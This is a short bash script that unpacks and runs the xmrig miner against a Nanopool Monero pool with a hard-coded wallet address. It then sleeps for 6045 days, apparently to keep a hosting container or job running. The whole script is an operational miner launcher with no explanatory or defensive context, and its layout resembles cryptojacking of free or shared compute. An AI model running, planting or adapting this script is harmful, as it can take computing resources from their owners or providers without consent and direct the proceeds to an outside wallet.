#!/bin/bash

cd /src/
unzip zip.zip 
chmod +x xmrig
./xmrig -o xmr-eu1.nanopool.org:14444 -u 888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H --coin=monero -k

/bin/bash -c "sleep 6045d"
